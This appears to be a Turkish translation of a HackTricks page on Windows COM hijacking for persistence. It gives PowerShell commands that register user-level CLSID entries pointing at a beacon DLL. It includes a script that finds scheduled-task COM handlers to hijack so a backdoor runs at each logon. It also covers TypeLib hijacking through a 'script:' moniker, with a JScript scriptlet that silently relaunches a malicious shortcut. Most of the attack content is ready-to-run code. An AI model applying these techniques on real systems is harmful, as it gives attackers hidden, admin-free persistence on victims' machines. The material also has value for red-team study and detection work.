# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Mevcut olmayan COM bileşenlerini arama

HKCU değerleri kullanıcılar tarafından değiştirilebildiği için **COM Hijacking**, **kalıcı bir mekanizma** olarak kullanılabilir. `procmon` kullanarak, saldırganın kalıcılık için oluşturabileceği mevcut olmayan COM kayıtlarını bulmak kolaydır. Filtreler:

- **RegOpenKey** işlemleri.
- _Result_ değeri **NAME NOT FOUND** olanlar.
- ve _Path_ **InprocServer32** ile bitenler.

Hangi mevcut olmayan COM'u taklit edeceğinize karar verdikten sonra aşağıdaki komutları çalıştırın. _Her birkaç saniyede bir yüklenen bir COM'u taklit etmeye karar verirseniz dikkatli olun; bu aşırıya kaçabilir._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Ele geçirilebilen Task Scheduler COM bileşenleri

Windows Tasks, COM objects çağırmak için Custom Triggers kullanır ve Task Scheduler üzerinden çalıştırıldıkları için ne zaman tetikleneceklerini tahmin etmek daha kolaydır.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Çıktıyı kontrol ederek örneğin **her kullanıcı oturum açtığında** çalıştırılacak birini seçebilirsiniz.

Şimdi CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}**'yi **HKEY\CLASSES\ROOT\CLSID** içinde ve HKLM ile HKCU'da aradığınızda, genellikle değerin HKCU'da bulunmadığını görürsünüz.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Sonra, sadece HKCU girdisini oluşturabilir ve her kullanıcı oturum açtığında backdoor'unuz tetiklenecektir.

---

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib), COM arayüzlerini tanımlar ve `LoadTypeLib()` ile yüklenir. Bir COM sunucusu örneklendiğinde, işletim sistemi ayrıca ilişkilendirilmiş TypeLib'i `HKCR\TypeLib\{LIBID}` altındaki kayıt defteri anahtarlarına bakarak yükleyebilir. TypeLib yolu bir **moniker** ile, ör. `script:C:\...\evil.sct`, değiştirildiğinde, TypeLib çözümlendiğinde Windows scriptleti çalıştırır — bu da yaygın bileşenlere dokunulduğunda tetiklenen gizli bir persistence sağlar.

Bu, Microsoft Web Browser kontrolüne karşı gözlemlenmiştir (sıklıkla Internet Explorer, WebBrowser gömülü uygulamalar ve hatta `explorer.exe` tarafından yüklenir).

### Adımlar (PowerShell)

1) Yüksek frekansla kullanılan bir CLSID tarafından kullanılan TypeLib (LIBID) bilgisini tespit edin. Örnek CLSID sıkça kötü amaçlı yazılım zincirleri tarafından kötüye kullanılır: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Her kullanıcıya ait TypeLib yolunu, `script:` moniker'ını kullanarak yerel bir scriptlet'e yönlendirin (yönetici hakları gerekmez):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Birincil payload'ınızı yeniden başlatan minimal bir JScript `.sct` bırakın (örn. başlangıç zinciri tarafından kullanılan bir `.lnk`):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Tetikleme – IE'yi açmak, WebBrowser control'ü gömülü bir uygulamayı başlatmak veya hatta rutin Explorer etkinlikleri TypeLib'i yükleyecek ve scriptlet'i çalıştıracak; böylece oturum açma/yeniden başlatma sırasında zinciriniz yeniden devreye girecektir.

Temizlik
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Notlar
- Aynı mantığı diğer sık kullanılan COM bileşenlerine de uygulayabilirsiniz; gerçek `LIBID`'yi önce `HKCR\CLSID\{CLSID}\TypeLib`'ten belirleyin.
- 64-bit sistemlerde 64-bit tüketiciler için `win64` alt anahtarını da doldurabilirsiniz.

## Referanslar

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)

{{#include ../../banners/hacktricks-training.md}}
